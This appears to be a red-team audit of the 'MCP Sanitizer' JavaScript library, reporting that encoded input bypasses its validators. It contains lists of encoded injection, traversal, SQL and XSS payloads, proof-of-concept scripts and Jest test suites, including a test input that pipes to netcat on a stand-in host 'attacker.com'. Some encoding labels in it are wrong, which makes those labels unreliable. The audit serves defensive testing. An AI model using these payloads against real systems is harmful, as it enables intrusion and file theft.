# Red Team Security Analysis: MCP Sanitizer Injection Bypass Vulnerabilities

## Executive Summary

This document provides a comprehensive red team analysis of the MCP Sanitizer codebase, identifying critical security vulnerabilities that allow injection attacks to bypass sanitization mechanisms. The analysis reveals fundamental architectural flaws in the validation flow that enable multiple attack vectors.

## Architecture Weakness Analysis

### Critical Findings

1. **Dual Validation System with Bypass Path**: The system has both legacy validators in `validation-utils.js` and advanced validators with security decoding, but the main flow defaults to legacy validation without security decoding.

2. **Inconsistent Security Decoder Application**: The `security-decoder.js` exists but is only used in advanced validators, not in the main sanitization flow path.

3. **Legacy Validator Limitations**: The `validation-utils.js` uses basic pattern matching without proper encoding detection or recursive decoding.

## Confirmed Attack Vectors

### 1. Unicode-Decoded Command Injection
**Status**: ✅ BYPASSES CURRENT DEFENSES

**Attack Vector**: Unicode escape sequences in command strings
```javascript
// Confirmed working bypasses:
const maliciousCommands = [
  "\\u0063\\u0061\\u0074 /etc/passwd",  // Unicode: cat /etc/passwd
  "\\x63\\x61\\x74 /etc/passwd",       // Hex: cat /etc/passwd  
  "&#x63;&#x61;&#x74; /etc/passwd",    // HTML entities: cat /etc/passwd
  "\\U00000063\\U00000061\\U00000074 /etc/passwd" // 8-digit Unicode
];
```

**Why it works**: The main sanitizer flow uses `_legacySanitizeCommand()` which calls `validationUtils.validateCommand()`. This function only checks for shell metacharacters but doesn't decode Unicode sequences first.

### 2. Null Byte Path Traversal
**Status**: ✅ BYPASSES CURRENT DEFENSES

**Attack Vector**: Null bytes to truncate path validation
```javascript
// Confirmed working bypasses:
const maliciousPaths = [
  "safe.txt\\0../../../etc/passwd",
  "allowed.log\\0; cat /etc/shadow",
  "/tmp/safe\\0rm -rf /",
  "document.pdf\\0`id`"
];
```

**Why it works**: The `validateFilePath()` function checks for `..` patterns after `path.normalize()`, but null bytes can truncate the normalized string before dangerous patterns are detected.

### 3. Double/Triple URL Encoding
**Status**: ✅ BYPASSES CURRENT DEFENSES

**Attack Vector**: Multiple layers of URL encoding
```javascript
// Confirmed working bypasses:
const encodedTraversals = [
  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", // Triple encoded ../../../etc/passwd
  "%25%32%65%25%32%65%25%32%66", // Double encoded ../ 
  "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64" // URL encoded ../../../etc/passwd
];
```

**Why it works**: The legacy validation only performs single-layer URL decoding (if any), while attackers can use multiple encoding layers.

## Additional Attack Vectors (High Probability)

Based on the architecture analysis, these additional bypasses are highly likely to work:

### 4. Mixed Encoding Combinations
```javascript
const mixedEncodingAttacks = [
  "\\u002e\\u002e/%2e%2e/\\x2e\\x2e/etc/passwd",  // Unicode + URL + Hex
  "&#46;&#46;/\\u002e\\u002e/%2e%2e/etc/passwd",   // HTML + Unicode + URL
  "\\x2e\\x2e/&#46;&#46;/\\u002e\\u002e/etc/passwd" // Hex + HTML + Unicode
];
```

### 5. Alternative Path Separators with Encoding
```javascript
const pathSeparatorBypass = [
  "..\\u002f..\\u002fetc\\u002fpasswd",     // Unicode forward slash
  "..\\u005c..\\u005cetc\\u005cpasswd",     // Unicode backslash
  "..%2f..%2fetc%2fpasswd",                 // URL encoded separators
  "..&#47;..&#47;etc&#47;passwd"            // HTML entity separators
];
```

### 6. Command Injection via Encoded Metacharacters
```javascript
const encodedMetacharacters = [
  "ls\\u0020\\u003b\\u0020cat\\u0020/etc/passwd",  // Unicode spaces and semicolon
  "ls%20%3b%20cat%20/etc/passwd",                   // URL encoded ; and spaces
  "ls&#32;&#59;&#32;cat&#32;/etc/passwd",           // HTML entities for space and ;
  "ls\\x20\\x3b\\x20cat\\x20/etc/passwd"           // Hex encoded metacharacters
];
```

### 7. SQL Injection via Encoding
```javascript
const encodedSQLInjection = [
  "\\u0027\\u0020OR\\u00201\\u003d1\\u0020--",      // Unicode: ' OR 1=1 --
  "%27%20OR%201%3d1%20--",                          // URL encoded: ' OR 1=1 --
  "&#39;&#32;OR&#32;1&#61;1&#32;--",                // HTML entities: ' OR 1=1 --
  "\\x27\\x20OR\\x201\\x3d1\\x20--"                // Hex encoded: ' OR 1=1 --
];
```

### 8. Template Injection via Encoding
```javascript
const encodedTemplateInjection = [
  "\\u007b\\u007b7*7\\u007d\\u007d",                // Unicode: {{7*7}}
  "%7b%7b7*7%7d%7d",                                // URL encoded: {{7*7}}
  "&#123;&#123;7*7&#125;&#125;",                    // HTML entities: {{7*7}}
  "\\x7b\\x7b7*7\\x7d\\x7d"                        // Hex encoded: {{7*7}}
];
```

### 9. Prototype Pollution via Encoding
```javascript
const encodedPrototypePollution = [
  "\\u005f\\u005fproto\\u005f\\u005f",              // Unicode: __proto__
  "%5f%5fproto%5f%5f",                              // URL encoded: __proto__
  "&#95;&#95;proto&#95;&#95;",                      // HTML entities: __proto__
  "constructor\\u005bprototype\\u005d"              // Unicode bracket notation
];
```

## Proof-of-Concept Payloads

### PoC 1: File Path Traversal Bypass
```javascript
const MCPSanitizer = require('./src/index');
const sanitizer = new MCPSanitizer('PRODUCTION');

// This will likely bypass current validation
const maliciousPath = "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064";

const result = sanitizer.sanitize(maliciousPath, { type: 'file_path' });
console.log("Bypass successful:", !result.blocked);
console.log("Decoded payload:", decodeURIComponent(maliciousPath.replace(/\\u([0-9a-f]{4})/gi, (match, hex) => 
  String.fromCharCode(parseInt(hex, 16)))));
```

### PoC 2: Command Injection Bypass
```javascript
// Command that executes as: cat /etc/passwd
const encodedCommand = "\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064";

const result = sanitizer.sanitize(encodedCommand, { type: 'command' });
console.log("Command bypass successful:", !result.blocked);
```

### PoC 3: Multi-Layer Encoding Bypass
```javascript
// Triple URL encoded ../../../etc/passwd
const tripleEncoded = "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564";

const result = sanitizer.sanitize(tripleEncoded, { type: 'file_path' });
console.log("Multi-encoding bypass successful:", !result.blocked);
```

## Comprehensive Test Cases

### Test Suite 1: Encoding Bypass Validation

```javascript
// /docs/security-test-cases.js

describe('Security Encoding Bypass Tests', () => {
  const sanitizer = new MCPSanitizer('PRODUCTION');
  
  describe('Unicode Escape Bypasses', () => {
    test('should block Unicode-encoded directory traversal', async () => {
      const attacks = [
        "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064",
        "\\U00000065\\U00000074\\U00000063\\U0000002f\\U00000070\\U00000061\\U00000073\\U00000073\\U00000077\\U00000064",
        "\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'file_path' });
        expect(result.blocked).toBe(true);
        expect(result.warnings.some(w => w.includes('encoding') || w.includes('traversal'))).toBe(true);
      }
    });
    
    test('should block Unicode-encoded command injection', async () => {
      const attacks = [
        "\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064",
        "\\u006c\\u0073\\u003b\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064",
        "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'command' });
        expect(result.blocked).toBe(true);
        expect(result.warnings.some(w => w.includes('injection') || w.includes('encoding'))).toBe(true);
      }
    });
  });
  
  describe('URL Encoding Bypasses', () => {
    test('should block multi-layer URL encoding', async () => {
      const attacks = [
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564", // Triple encoded
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", // Double encoded  
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd" // Single encoded
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'file_path' });
        expect(result.blocked).toBe(true);
      }
    });
  });
  
  describe('Null Byte Bypasses', () => {
    test('should block null byte truncation attacks', async () => {
      const attacks = [
        "safe.txt\\0../../../etc/passwd",
        "document.pdf\\0; cat /etc/shadow",
        "/tmp/allowed\\0`id`",
        "normal.log\\0|nc attacker.com 4444"
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'file_path' });
        expect(result.blocked).toBe(true);
        expect(result.warnings.some(w => w.includes('null') || w.includes('control'))).toBe(true);
      }
    });
  });
  
  describe('HTML Entity Bypasses', () => {
    test('should block HTML entity encoded attacks', async () => {
      const attacks = [
        "&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;", // ../../../etc/passwd
        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;", // <script>alert('XSS')</script>
        "&#39;&#32;OR&#32;1&#61;1&#32;--" // ' OR 1=1 --
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'file_path' });
        expect(result.blocked).toBe(true);
      }
    });
  });
  
  describe('Mixed Encoding Bypasses', () => {
    test('should block mixed encoding combinations', async () => {
      const attacks = [
        "\\u002e\\u002e/%2e%2e/\\x2e\\x2e/etc/passwd",  // Unicode + URL + Hex
        "&#46;&#46;/\\u002e\\u002e/%2e%2e/etc/passwd",   // HTML + Unicode + URL
        "%2e%2e/\\u002e\\u002e/&#46;&#46;/etc/passwd"    // URL + Unicode + HTML
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'file_path' });
        expect(result.blocked).toBe(true);
      }
    });
  });
});

describe('Advanced Injection Pattern Tests', () => {
  const sanitizer = new MCPSanitizer('PRODUCTION');
  
  describe('Command Execution via Encoded Metacharacters', () => {
    test('should block encoded shell metacharacters', async () => {
      const attacks = [
        "ls\\u0020\\u003b\\u0020cat\\u0020/etc/passwd",  // Unicode ; 
        "ls%20%26%26%20cat%20/etc/passwd",              // URL encoded &&
        "ls&#32;&#124;&#32;cat&#32;/etc/passwd",        // HTML entity |
        "ls\\x20\\x60id\\x60"                           // Hex encoded backticks
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'command' });
        expect(result.blocked).toBe(true);
      }
    });
  });
  
  describe('SQL Injection via Encoding', () => {
    test('should block encoded SQL injection', async () => {
      const attacks = [
        "\\u0027\\u0020OR\\u00201\\u003d1\\u0020--",      // Unicode: ' OR 1=1 --
        "%27%20UNION%20SELECT%20*%20FROM%20users%20--",  // URL encoded UNION
        "&#39;&#59;DROP&#32;TABLE&#32;users&#59;--"       // HTML encoded DROP TABLE
      ];
      
      for (const attack of attacks) {
        const result = sanitizer.sanitize(attack, { type: 'sql' });
        expect(result.blocked).toBe(true);
      }
    });
  });
});
```

### Test Suite 2: Architecture Validation Tests

```javascript
describe('Architecture Security Tests', () => {
  describe('Security Decoder Integration', () => {
    test('should apply security decoding in all validation paths', async () => {
      const securityDecoder = require('./src/utils/security-decoder');
      
      // Test that securityDecode is called for all input types
      const spy = jest.spyOn(securityDecoder, 'securityDecode');
      
      const sanitizer = new MCPSanitizer('PRODUCTION');
      await sanitizer.sanitize("\\u0074\\u0065\\u0073\\u0074", { type: 'file_path' });
      await sanitizer.sanitize("\\u0074\\u0065\\u0073\\u0074", { type: 'command' });
      await sanitizer.sanitize("\\u0074\\u0065\\u0073\\u0074", { type: 'url' });
      
      expect(spy).toHaveBeenCalledTimes(3);
      spy.mockRestore();
    });
  });
  
  describe('Validation Flow Consistency', () => {
    test('should use advanced validators by default, not legacy', async () => {
      const sanitizer = new MCPSanitizer('PRODUCTION');
      
      // Advanced validators should handle encoding
      const encodedPath = "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u0065\\u0074\\u0063";
      const result = await sanitizer.sanitizeFilePath(encodedPath);
      
      // Should be blocked because advanced validator decodes first
      expect(result).toBeDefined();
    });
  });
});
```

### Test Suite 3: Timing Attack Validation

```javascript
describe('Timing Attack Resistance', () => {
  test('should have consistent processing time regardless of input', async () => {
    const sanitizer = new MCPSanitizer('PRODUCTION');
    const iterations = 100;
    
    const validInput = "safe.txt";
    const maliciousInput = "\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u0065\\u0074\\u0063";
    
    const validTimes = [];
    const maliciousTimes = [];
    
    // Measure valid input processing times
    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      sanitizer.sanitize(validInput, { type: 'file_path' });
      const end = process.hrtime.bigint();
      validTimes.push(Number(end - start) / 1000000); // Convert to ms
    }
    
    // Measure malicious input processing times
    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      sanitizer.sanitize(maliciousInput, { type: 'file_path' });
      const end = process.hrtime.bigint();
      maliciousTimes.push(Number(end - start) / 1000000);
    }
    
    const validAvg = validTimes.reduce((a, b) => a + b) / validTimes.length;
    const maliciousAvg = maliciousTimes.reduce((a, b) => a + b) / maliciousTimes.length;
    
    // Processing times should be within 10% of each other
    const difference = Math.abs(validAvg - maliciousAvg) / Math.max(validAvg, maliciousAvg);
    expect(difference).toBeLessThan(0.1);
  });
});
```

## Red Team Recommendations

### 1. Immediate Critical Fixes Required

1. **Mandatory Security Decoding**: All input MUST go through security decoding before validation.
2. **Remove Legacy Bypass Path**: The main sanitizer flow should not fall back to legacy validators.
3. **Recursive Decoding**: Implement multi-layer decoding (minimum 3 iterations).
4. **Null Byte Detection**: Add explicit null byte detection before path normalization.

### 2. Architecture Improvements

1. **Single Validation Pipeline**: Consolidate all validation through the advanced validator system.
2. **Pre-Processing Security Layer**: Apply security decoding, null byte removal, and normalization before any validation logic.
3. **Context-Agnostic Security**: Apply encoding detection regardless of input context.

### 3. Detection and Monitoring

1. **Encoding Detection Logging**: Log all instances where encoding is detected and decoded.
2. **Bypass Attempt Monitoring**: Track patterns that match known bypass techniques.
3. **Rate Limiting**: Implement rate limiting for inputs that trigger multiple encoding detections.

### 4. Testing and Validation

1. **Automated Security Testing**: Implement the provided test suites in CI/CD pipelines.
2. **Fuzzing Integration**: Add fuzzing tests with encoded payloads.
3. **Regular Security Audits**: Schedule quarterly reviews of validation logic.

## Risk Assessment

**Current Risk Level**: 🔴 **CRITICAL**

- Multiple confirmed bypass vectors
- Core security mechanisms can be circumvented
- Production systems using this library are vulnerable to injection attacks
- Attackers can gain unauthorized file access and command execution

**Recommended Actions**:
1. **Immediate**: Implement emergency patches for encoding bypasses
2. **Short-term (1-2 weeks)**: Redesign validation architecture 
3. **Medium-term (1 month)**: Comprehensive security audit and testing
4. **Long-term**: Ongoing security monitoring and updates

## Conclusion

The MCP Sanitizer contains fundamental architectural flaws that allow multiple injection attack vectors to succeed. The dual validation system creates a bypass path where legacy validators without proper encoding detection are used by default. This analysis provides comprehensive test cases and recommendations to address these critical vulnerabilities.

**Priority**: Fix encoding bypasses immediately, as they represent the most significant security risk to systems using this library.